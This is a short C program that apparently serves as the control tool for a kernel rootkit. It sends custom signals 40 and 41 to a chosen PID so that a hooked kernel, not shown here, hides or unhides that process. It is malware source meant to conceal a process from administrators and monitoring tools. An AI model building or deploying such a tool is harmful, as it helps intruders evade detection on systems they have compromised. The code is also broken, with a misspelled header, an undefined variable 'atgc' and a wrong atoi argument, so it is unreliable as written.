#include <stdio.h>
#include <stdlib.h>
#include <sys/type.h>
#include <signal.h>
#include <errno.h>

#define SIGHIDE 40
#define SIGUNHIDE 41

void usage(char *s)
{
	printf("Usage: %s [+/-]PID\n"
		"\t+\tHide PID\n"
		"\t-\tUnhide PID\n", s);
	exit(1);
}
int main(int argc, char *argv[])
{
	if(atgc !=2)
		usage(argv[0]);

	switch(argv[1][0])
	{
		case '+':
		kill(atoi(argv[1][1]), SIGHIDE);
		break;

		case '-':
		kill(atoi(argv[1][1]), SIGUNHIDE);
		break;

		default:
		usage(argv[0]);
		break;
	}
	if(errno)
		perror("kill");
	return 0;
}